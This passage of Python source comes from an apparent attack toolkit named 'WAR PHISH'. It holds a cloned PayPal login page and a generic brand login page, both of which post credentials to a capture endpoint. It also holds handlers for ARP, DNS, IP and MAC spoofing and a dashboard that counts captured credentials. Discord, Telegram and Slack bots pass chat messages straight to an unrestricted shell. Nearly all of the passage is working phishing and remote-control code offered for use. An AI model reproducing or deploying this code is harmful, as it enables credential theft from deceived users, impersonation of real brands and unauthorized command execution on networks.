.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}
.logo{color:#003087;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px}
</style>
</head>
<body><div class="login-box"><div class="logo">PayPal</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>'''
    
    def _get_default_template(self, platform: str):
        return f'''<!DOCTYPE html>
<html><head><title>{platform.title()} Login</title>
<style>
body{{font-family:Arial;background:linear-gradient(135deg,#0a0a2e 0%,#1a1a4e 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:white;border-radius:16px;padding:40px;width:400px}}
.logo{{font-size:32px;text-align:center;margin-bottom:20px;color:#1a6eff}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}}
button{{width:100%;padding:12px;background:#1a6eff;color:white;border:none;border-radius:8px}}
</style>
</head>
<body><div class="login-box"><div class="logo">🦈 {platform}</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>'''
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    @staticmethod
    def run(cmd: str, timeout: int = 60) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'execution_time': time.time() - start_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f'Command timed out after {timeout}s', 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    @staticmethod
    def nmap(target: str, options: str = "") -> Dict:
        cmd = f"nmap {options} {target}"
        return CommandExecutor.run(cmd, 300)
    
    @staticmethod
    def curl(url: str, options: str = "") -> Dict:
        cmd = f"curl {options} {url}"
        return CommandExecutor.run(cmd, 30)
    
    @staticmethod
    def wget(url: str, options: str = "") -> Dict:
        cmd = f"wget {options} {url}"
        return CommandExecutor.run(cmd, 60)
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict:
        if platform.system().lower() == 'windows':
            cmd = f"ping -n {count} {target}"
        else:
            cmd = f"ping -c {count} {target}"
        return CommandExecutor.run(cmd, 30)
    
    @staticmethod
    def traceroute(target: str) -> Dict:
        if platform.system().lower() == 'windows':
            cmd = f"tracert -d {target}"
        else:
            cmd = f"traceroute -n {target}"
        return CommandExecutor.run(cmd, 60)
    
    @staticmethod
    def whois(target: str) -> Dict:
        return CommandExecutor.run(f"whois {target}", 30)
    
    @staticmethod
    def dig(domain: str, record_type: str = "A") -> Dict:
        return CommandExecutor.run(f"dig {domain} {record_type} +short", 15)
    
    @staticmethod
    def ssh(user: str, host: str, command: str = None, port: int = 22) -> Dict:
        if command:
            cmd = f"ssh -p {port} {user}@{host} '{command}'"
        else:
            cmd = f"ssh -p {port} {user}@{host}"
        return CommandExecutor.run(cmd, 60)
    
    @staticmethod
    def netcat(host: str, port: int, data: str = None) -> Dict:
        if data:
            cmd = f"echo '{data}' | nc {host} {port}"
        else:
            cmd = f"nc -zv -w 2 {host} {port}"
        return CommandExecutor.run(cmd, 15)
    
    @staticmethod
    def shodan(query: str) -> Dict:
        return CommandExecutor.run(f"shodan {query}", 30)

# =====================
# WEB SERVER (Complete UI)
# =====================
WEB_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🦈 WAR PHISH - Cyber Command Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Fira Code', monospace; }
        body { background: radial-gradient(circle at 20% 30%, #0a0a2e, #050515); min-height: 100vh; padding: 20px; }
        .container { max-width: 1600px; margin: 0 auto; }
        
        /* Header */
        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; margin-bottom: 28px; background: rgba(10, 10, 46, 0.8); border-radius: 28px; padding: 16px 28px; border: 1px solid #1a6eff; backdrop-filter: blur(10px); }
        .logo h1 { font-size: 1.8rem; background: linear-gradient(135deg, #1a6eff, #00aaff); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .logo i { color: #1a6eff; font-size: 2rem; margin-right: 10px; }
        .status { display: flex; gap: 12px; }
        .badge { padding: 8px 16px; background: rgba(26, 110, 255, 0.2); border-radius: 30px; border: 1px solid #1a6eff; font-size: 0.8rem; }
        
        /* Main Layout */
        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
        @media (max-width: 900px) { .main-grid { grid-template-columns: 1fr; } }
        
        /* Terminal Card */
        .terminal-card { background: rgba(10, 10, 46, 0.9); border-radius: 24px; border: 1px solid #1a6eff; padding: 20px; backdrop-filter: blur(10px); }
        .terminal-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; border-bottom: 1px solid #1a6eff; padding-bottom: 12px; }
        .terminal-header i { color: #1a6eff; font-size: 1.2rem; }
        .cmd-input-group { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
        #cmdInput { flex: 4; background: #050515; border: 1px solid #1a6eff; border-radius: 40px; padding: 12px 20px; color: #00ffaa; font-family: 'Fira Code', monospace; outline: none; }
        .btn-exec { background: linear-gradient(135deg, #1a6eff, #0a3e9e); border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-exec:hover { transform: scale(0.98); filter: brightness(1.1); }
        .output-area { background: #050515; border-radius: 16px; padding: 16px; max-height: 300px; overflow-y: auto; font-size: 0.8rem; border: 1px solid #1a6eff33; }
        .output-line { padding: 4px 0; border-left: 2px solid #1a6eff; padding-left: 10px; margin: 4px 0; word-break: break-word; }
        
        /* Quick Commands */
        .quick-cmds { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; }
        .quick-btn { background: rgba(26, 110, 255, 0.1); border: 1px solid #1a6eff; border-radius: 20px; padding: 6px 14px; font-size: 0.7rem; cursor: pointer; transition: 0.2s; }
        .quick-btn:hover { background: rgba(26, 110, 255, 0.3); }
        
        /* Charts */
        .charts-card { background: rgba(10, 10, 46, 0.9); border-radius: 24px; border: 1px solid #1a6eff; padding: 20px; backdrop-filter: blur(10px); }
        .charts-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 15px; }
        .chart-container { background: #050515; border-radius: 16px; padding: 15px; text-align: center; }
        canvas { max-height: 200px; width: 100%; }
        
        /* Ports List */
        .ports-card { background: rgba(10, 10, 46, 0.9); border-radius: 24px; border: 1px solid #1a6eff; padding: 20px; margin-top: 24px; }
        .ports-grid { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 15px; }
        .port-list { flex: 1; background: #050515; border-radius: 16px; padding: 15px; }
        .port-tag { display: inline-block; background: #1a6eff33; padding: 4px 10px; border-radius: 20px; margin: 4px; font-size: 0.7rem; }
        .port-tag.open { background: #00aa55; color: #fff; }
        .port-tag.closed { background: #aa3355; color: #fff; }
        
        /* Footer */
        .footer { text-align: center; margin-top: 24px; padding: 16px; color: #6699cc; font-size: 0.7rem; }
        
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #050515; }
        ::-webkit-scrollbar-thumb { background: #1a6eff; border-radius: 3px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo">
            <i class="fas fa-shark"></i>
            <h1>WAR PHISH</h1>
        </div>
        <div class="status">
            <div class="badge"><i class="fas fa-terminal"></i> Active</div>
            <div class="badge"><i class="fas fa-globe"></i> Web UI</div>
        </div>
    </div>

    <div class="main-grid">
        <!-- Terminal Panel -->
        <div class="terminal-card">
            <div class="terminal-header">
                <i class="fas fa-skull-crossbones"></i>
                <span>CYBER COMMAND TERMINAL</span>
            </div>
            <div class="quick-cmds">
                <span class="quick-btn" onclick="setCommand('help')">help</span>
                <span class="quick-btn" onclick="setCommand('status')">status</span>
                <span class="quick-btn" onclick="setCommand('scan 127.0.0.1')">scan 127.0.0.1</span>
                <span class="quick-btn" onclick="setCommand('ping 127.0.0.1')">ping 127.0.0.1</span>
                <span class="quick-btn" onclick="setCommand('whois example.com')">whois example.com</span>
                <span class="quick-btn" onclick="setCommand('generate_phishing facebook')">phish fb</span>
                <span class="quick-btn" onclick="setCommand('spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1')">spoof_ip</span>
            </div>
            <div class="cmd-input-group">
                <input type="text" id="cmdInput" placeholder="🦈 Enter command..." autocomplete="off">
                <button class="btn-exec" id="execBtn"><i class="fas fa-bolt"></i> EXECUTE</button>
            </div>
            <div class="output-area" id="terminalOutput">
                <div class="output-line">> 🦈 WAR PHISH v1.0.0 Ready</div>
                <div class="output-line">> Type <span style="color:#1a6eff;">help</span> for available commands</div>
                <div class="output-line">> Multi-Platform: Discord | Telegram | Slack | iMessage | Signal | Web</div>
            </div>
        </div>

        <!-- Charts Panel -->
        <div class="charts-card">
            <div class="terminal-header">
                <i class="fas fa-chart-line"></i>
                <span>ANALYTICS DASHBOARD</span>
            </div>
            <div class="charts-grid">
                <div class="chart-container">
                    <canvas id="barChart"></canvas>
                    <p style="margin-top: 10px; font-size: 0.7rem;">Commands Executed</p>
                </div>
                <div class="chart-container">
                    <canvas id="pieChart"></canvas>
                    <p style="margin-top: 10px; font-size: 0.7rem;">Credential Types</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Ports & Results -->
    <div class="ports-card">
        <div class="terminal-header">
            <i class="fas fa-portrait"></i>
            <span>PORT SCAN RESULTS</span>
        </div>
        <div class="ports-grid">
            <div class="port-list">
                <h4><i class="fas fa-unlock-alt"></i> OPEN PORTS</h4>
                <div id="openPorts"></div>
            </div>
            <div class="port-list">
                <h4><i class="fas fa-lock"></i> CLOSED PORTS</h4>
                <div id="closedPorts"></div>
            </div>
        </div>
        <div style="margin-top: 15px; text-align: right;">
            <button class="quick-btn" id="scanDemoBtn"><i class="fas fa-radar"></i> DEMO SCAN</button>
        </div>
    </div>

    <div class="footer">
        <i class="fas fa-shark"></i> WAR PHISH - Multi-Platform Cybersecurity Command Center | Discord | Telegram | Slack | iMessage | Signal | Web
    </div>
</div>

<script>
    let barChart, pieChart;
    
    function addOutput(text, isError = false) {
        const output = document.getElementById('terminalOutput');
        const div = document.createElement('div');
        div.className = 'output-line';
        div.style.borderLeftColor = isError ? '#ff3355' : '#1a6eff';
        div.style.color = isError ? '#ffaaaa' : '#aaffdd';
        div.innerHTML = `<span style="color:#1a6eff;">[${new Date().toLocaleTimeString()}]</span> ${text}`;
        output.appendChild(div);
        div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        while (output.children.length > 50) output.removeChild(output.firstChild);
    }
    
    function setCommand(cmd) {
        document.getElementById('cmdInput').value = cmd;
        document.getElementById('cmdInput').focus();
    }
    
    async function runCommand() {
        const input = document.getElementById('cmdInput');
        const cmd = input.value.trim();
        if (!cmd) return;
        addOutput(`> ${cmd}`);
        input.value = '';
        
        try {
            const res = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            const data = await res.json();
            if (data.success) {
                addOutput(data.output || 'Command executed successfully');
            } else {
                addOutput(`ERROR: ${data.error || data.output}`, true);
            }
            addOutput(`[${(data.execution_time || 0).toFixed(2)}s]`);
            loadStats();
        } catch(e) {
            addOutput(`Request failed: ${e.message}`, true);
        }
    }
    
    async function loadStats() {
        try {
            const res = await fetch('/api/stats');
            const stats = await res.json();
            if (barChart) {
                barChart.data.datasets[0].data = [stats.total_commands || 0, stats.total_phishing_links || 0, stats.captured_credentials || 0];
                barChart.update();
            }
            if (pieChart) {
                pieChart.data.datasets[0].data = [stats.captured_credentials || 0, stats.total_phishing_links || 0];
                pieChart.update();
            }
        } catch(e) { console.error(e); }
    }
    
    async function loadPorts() {
        try {
            const res = await fetch('/api/ports');
            const data = await res.json();
            const openDiv = document.getElementById('openPorts');
            const closedDiv = document.getElementById('closedPorts');
            openDiv.innerHTML = (data.open_ports || []).map(p => `<span class="port-tag open">${p.port}/${p.protocol}</span>`).join(' ') || '<span>No open ports</span>';
            closedDiv.innerHTML = (data.closed_ports || []).map(p => `<span class="port-tag closed">${p.port}/${p.protocol}</span>`).join(' ') || '<span>No closed ports</span>';
        } catch(e) { console.error(e); }
    }
    
    document.getElementById('execBtn').addEventListener('click', runCommand);
    document.getElementById('cmdInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') runCommand(); });
    document.getElementById('scanDemoBtn').addEventListener('click', () => setCommand('scan 127.0.0.1'));
    
    const barCtx = document.getElementById('barChart').getContext('2d');
    barChart = new Chart(barCtx, {
        type: 'bar',
        data: { labels: ['Commands', 'Phish Links', 'Credentials'], datasets: [{ label: 'Count', data: [0, 0, 0], backgroundColor: '#1a6eff', borderRadius: 8 }] },
        options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: '#ccc' } } } }
    });
    
    const pieCtx = document.getElementById('pieChart').getContext('2d');
    pieChart = new Chart(pieCtx, {
        type: 'pie',
        data: { labels: ['Credentials', 'Phishing Links'], datasets: [{ data: [0, 0], backgroundColor: ['#1a6eff', '#00aa55'] }] },
        options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { position: 'bottom', labels: { color: '#ccc' } } } }
    });
    
    loadStats();
    loadPorts();
    setInterval(() => { loadStats(); loadPorts(); }, 10000);
    addOutput('🦈 WAR PHISH Ready | Type help for commands');
</script>
</body>
</html>'''

class WebHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(WEB_HTML.encode('utf-8'))
        elif self.path == '/api/stats':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            if self.server_instance:
                stats = self.server_instance.db.get_statistics()
                self.wfile.write(json.dumps(stats).encode('utf-8'))
            else:
                self.wfile.write(json.dumps({}).encode('utf-8'))
        elif self.path == '/api/ports':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'open_ports': [], 'closed_ports': []}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/command':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                command = data.get('command', '')
                if self.server_instance:
                    result = self.server_instance.execute_command(command, 'web')
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(result).encode('utf-8'))
                else:
                    self.send_response(500)
                    self.end_headers()
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

class WebServer:
    def __init__(self, handler, db: DatabaseManager, port: int = 5000):
        self.handler = handler
        self.db = db
        self.port = port
        self.server = None
    
    def start(self):
        try:
            WebHandler.server_instance = self
            self.server = HTTPServer(("0.0.0.0", self.port), WebHandler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            print(f"{Colors.GREEN}✅ Web server started on http://localhost:{self.port}{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.RED}❌ Failed to start web server: {e}{Colors.RESET}")
            return False
    
    def execute_command(self, command: str, source: str) -> Dict:
        return self.handler.execute(command, source)
    
    def stop(self):
        if self.server:
            self.server.shutdown()

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, command_handler):
        self.handler = command_handler
        self.bot = None
        self.running = False
    
    def start(self, token: str, prefix: str = '!'):
        if not DISCORD_AVAILABLE:
            print(f"{Colors.RED}❌ Discord.py not installed{Colors.RESET}")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.bot = commands.Bot(command_prefix=prefix, intents=intents)
            
            @self.bot.event
            async def on_ready():
                print(f"{Colors.GREEN}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
                self.running = True
            
            @self.bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                if message.content.startswith(prefix):
                    cmd = message.content[len(prefix):].strip()
                    result = self.handler.execute(cmd, 'discord')
                    output = result.get('output', '')[:1900]
                    await message.channel.send(f"```\n{output}\n```\n_Time: {result.get('execution_time', 0):.2f}s_")
                await self.bot.process_commands(message)
            
            thread = threading.Thread(target=lambda: self.bot.run(token), daemon=True)
            thread.start()
            return True
        except Exception as e:
            print(f"{Colors.RED}Discord error: {e}{Colors.RESET}")
            return False

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, command_handler):
        self.handler = command_handler
        self.client = None
        self.running = False
    
    def start(self, api_id: str, api_hash: str, bot_token: str = None):
        if not TELETHON_AVAILABLE:
            print(f"{Colors.RED}❌ Telethon not installed{Colors.RESET}")
            return False
        
        try:
            async def run():
                self.client = TelegramClient('warphish_session', int(api_id), api_hash)
                await self.client.start(bot_token=bot_token if bot_token else None)
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith('/'):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram')
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```\n{output}\n```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
                await self.client.run_until_disconnected()
            
            thread = threading.Thread(target=lambda: asyncio.run(run()), daemon=True)
            thread.start()
            return True
        except Exception as e:
            print(f"{Colors.RED}Telegram error: {e}{Colors.RESET}")
            return False

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, command_handler):
        self.handler = command_handler
        self.client = None
        self.running = False
        self.last_ts = {}
    
    def start(self, token: str, channel: str = 'general', prefix: str = '!'):
        if not SLACK_AVAILABLE:
            print(f"{Colors.RED}❌ Slack SDK not installed{Colors.RESET}")
            return False
        
        try:
            self.client = WebClient(token=token)
            
            def monitor():
                while True:
                    try:
                        response = self.client.conversations_history(channel=channel, limit=5)
                        if response['ok'] and response['messages']:
                            for msg in response['messages']:
                                if msg.get('text', '').startswith(prefix):
                                    ts = msg.get('ts')
                                    if self.last_ts.get(channel) != ts:
                                        self.last_ts[channel] = ts
                                        cmd = msg['text'][len(prefix):].strip()
                                        result = self.handler.execute(cmd, 'slack')
                                        self.client.chat_postMessage(
                                            channel=channel,
                                            text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*")
                        time.sleep(2)
                    except Exception as e:
                        time.sleep(10)
            
            thread = threading.Thread(target=monitor, daemon=True)
            thread.start()
            print(f"{Colors.GREEN}✅ Slack bot connected{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.RED}Slack error: {e}{Colors.RESET}")
            return False

# =====================
# iMESSAGE BOT (macOS only)
# =====================
class iMessageBot:
    def __init__(self, command_handler):
        self.handler = command_handler
        self.running = False
    
    def start(self):
        if not IMESSAGE_AVAILABLE:
            print(f"{Colors.RED}❌ iMessage only available on macOS{Colors.RESET}")
            return False
        
        print(f"{Colors.GREEN}✅ iMessage integration available (macOS){Colors.RESET}")
        self.running = True
        return True

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    def __init__(self, command_handler):
        self.handler = command_handler
        self.running = False
    
    def start(self):
        if not SIGNAL_CLI_AVAILABLE:
            print(f"{Colors.RED}❌ signal-cli not found. Install with: sudo apt install signal-cli{Colors.RESET}")
            return False
        
        print(f"{Colors.GREEN}✅ Signal integration available (requires signal-cli){Colors.RESET}")
        self.running = True
        return True

# =====================
# GOOGLE CHAT BOT
# =====================
class GoogleChatBot:
    def __init__(self, command_handler):
        self.handler = command_handler
        self.running = False
    
    def start(self):
        if not GOOGLE_CHAT_AVAILABLE:
            print(f"{Colors.RED}❌ Google Chat SDK not installed{Colors.RESET}")
            return False
        
        print(f"{Colors.GREEN}✅ Google Chat integration available{Colors.RESET}")
        self.running = True
        return True

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, spoof_engine: SpoofingEngine, phishing_server: PhishingServer):
        self.db = db
        self.spoof = spoof_engine
        self.phishing = phishing_server
        self.executor = CommandExecutor()
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict:
        return {
            'help': self._cmd_help,
            'status': self._cmd_status,
            'clear': self._cmd_clear,
            'exit': self._cmd_exit,
            'time': self._cmd_time,
            'date': self._cmd_date,
            'history': self._cmd_history,
            'threats': self._cmd_threats,
            'report': self._cmd_report,
            'ping': self._cmd_ping,
            'scan': self._cmd_scan,
            'nmap': self._cmd_nmap,
            'traceroute': self._cmd_traceroute,
            'whois': self._cmd_whois,
            'dns': self._cmd_dns,
            'curl': self._cmd_curl,
            'wget': self._cmd_wget,
            'nc': self._cmd_nc,
            'ssh': self._cmd_ssh,
            'shodan': self._cmd_shodan,
            'spoof_ip': self._cmd_spoof_ip,
            'spoof_mac': self._cmd_spoof_mac,
            'arp_spoof': self._cmd_arp_spoof,
            'dns_spoof': self._cmd_dns_spoof,
            'stop_spoof': self._cmd_stop_spoof,
            'generate_phishing': self._cmd_generate_phishing,
            'phishing_start': self._cmd_phishing_start,
            'phishing_stop': self._cmd_phishing_stop,
            'phishing_status': self._cmd_phishing_status,
            'phishing_links': self._cmd_phishing_links,
            'credentials': self._cmd_credentials,
        }
    
    def execute(self, command: str, source: str = "local") -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.command_map:
            try:
                result = self.command_map[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}"}
        else:
            result = self.executor.run(command)
        
        execution_time = time.time() - start_time
        self.db.log_command(command, source, source, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    def _cmd_help(self, args):
        help_text = f"""
{Colors.CYAN}🦈 WAR PHISH v1.0.0 - HELP MENU{Colors.RESET}

{Colors.GREEN}📡 NETWORK COMMANDS:{Colors.RESET}
  ping <target>           - ICMP ping test
  scan <target> [ports]   - Port scan (default 1-1000)
  nmap <target> [options] - Full nmap scan
  traceroute <target>     - Network path tracing
  whois <domain>          - WHOIS lookup
  dns <domain>            - DNS lookup
  curl <url> [options]    - HTTP request
  wget <url> [options]    - Download file
  nc <host> <port>        - Netcat connection
  ssh <user>@<host>       - SSH connection

{Colors.GREEN}🎭 SPOOFING COMMANDS:{Colors.RESET}
  spoof_ip <orig> <spoof> <target> [iface] - IP spoofing
  spoof_mac <iface> <mac>                  - MAC spoofing
  arp_spoof <target> <gateway> [iface]     - ARP spoofing
  dns_spoof <domain> <ip> [iface]          - DNS spoofing
  stop_spoof [id]                          - Stop spoofing

{Colors.GREEN}🎣 PHISHING COMMANDS:{Colors.RESET}
  generate_phishing <platform>             - Generate phishing link
  phishing_start <link_id> [port]          - Start phishing server
  phishing_stop                            - Stop phishing server
  phishing_status                          - Check server status
  phishing_links                           - List all links
  credentials                              - View captured credentials

{Colors.GREEN}📊 SYSTEM COMMANDS:{Colors.RESET}
  status              - System status
  threats             - Recent threats
  report              - Security report
  history [limit]     - Command history
  time/date           - Current time/date
  clear               - Clear screen
  help                - This menu
  exit                - Exit program

{Colors.YELLOW}Examples:{Colors.RESET}
  ping 8.8.8.8
  scan 192.168.1.1
  generate_phishing facebook
  spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1
  arp_spoof 192.168.1.100 192.168.1.1
"""
        return {'success': True, 'output': help_text}
    
    def _cmd_status(self, args):
        stats = self.db.get_statistics()
        output = f"""
{Colors.CYAN}🦈 WAR PHISH System Status{Colors.RESET}
{'='*40}
📊 Statistics:
  • Total Commands: {stats.get('total_commands', 0)}
  • Phishing Links: {stats.get('total_phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • Port Scans: {stats.get('total_port_scans', 0)}
  • Spoofing Attempts: {stats.get('total_spoofing', 0)}
  • Threats Detected: {stats.get('total_threats', 0)}

🎯 Server Status:
  • Phishing Server: {'🟢 Running' if self.phishing.running else '⚪ Stopped'}
  • Web Dashboard: 🟢 Running on http://localhost:5000
"""
        return {'success': True, 'output': output}
    
    def _cmd_clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _cmd_exit(self, args):
        return {'success': True, 'output': 'exit'}
    
    def _cmd_time(self, args):
        return {'success': True, 'output': f"🕐 {datetime.datetime.now().strftime('%H:%M:%S')}"}
    
    def _cmd_date(self, args):
        return {'success': True, 'output': f"📅 {datetime.datetime.now().strftime('%A, %B %d, %Y')}"}
    
    def _cmd_history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.get_command_history(limit)
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "\n".join([f"{h['timestamp'][:19]} - {h['command'][:50]}" for h in history])
        return {'success': True, 'output': output}
    
    def _cmd_threats(self, args):
        threats = self.db.get_recent_threats(10)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            output += f"  {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _cmd_report(self, args):
        stats = self.db.get_statistics()
        creds = self.db.get_captured_credentials(10)
        report = f"""WAR PHISH Security Report
Generated: {datetime.datetime.now().isoformat()}
{'='*40}

Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Spoofing Attempts: {stats.get('total_spoofing', 0)}

Recent Credentials:
"""
        for c in creds[:5]:
            report += f"  - {c['timestamp'][:19]}: {c['username']} from {c['ip_address']}\n"
        
        filename = f"warphish_report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _cmd_ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        result = self.executor.ping(args[0])
        return result
    
    def _cmd_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.executor.nmap(target, f"-p {ports} -T4")
        
        # Parse open ports
        open_ports = []
        if result['success']:
            lines = result['output'].split('\n')
            for line in lines:
                if '/tcp' in line and 'open' in line:
                    parts = line.split()
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        try:
                            open_ports.append({'port': int(port_proto[0]), 'protocol': port_proto[1], 'service': parts[2] if len(parts) > 2 else 'unknown'})
                        except:
                            pass
            self.db.log_port_scan(target, open_ports, result.get('execution_time', 0), result['success'])
        
        return result
    
    def _cmd_nmap(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.executor.nmap(target, options)
        return result
    
    def _cmd_traceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.executor.traceroute(args[0])
        return result
    
    def _cmd_whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.executor.whois(args[0])
        return result
    
    def _cmd_dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain>'}
        result = self.executor.dig(args[0])
        return result
    
    def _cmd_curl(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl <url> [options]'}
        url = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else '-s'
        result = self.executor.curl(url, options)
        return result
    
    def _cmd_wget(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [options]'}
        url = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else '-q'
        result = self.executor.wget(url, options)
        return result
    
    def _cmd_nc(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc <host> <port> [data]'}
        host = args[0]
        try:
            port = int(args[1])
        except:
            return {'success': False, 'output': f'Invalid port: {args[1]}'}
        data = args[2] if len(args) > 2 else None
        result = self.executor.netcat(host, port, data)
        return result
    
    def _cmd_ssh(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ssh <user>@<host> [command]'}
        user_host = args[0]
        if '@' not in user_host:
            return {'success': False, 'output': 'Format: user@host'}
        user, host = user_host.split('@')
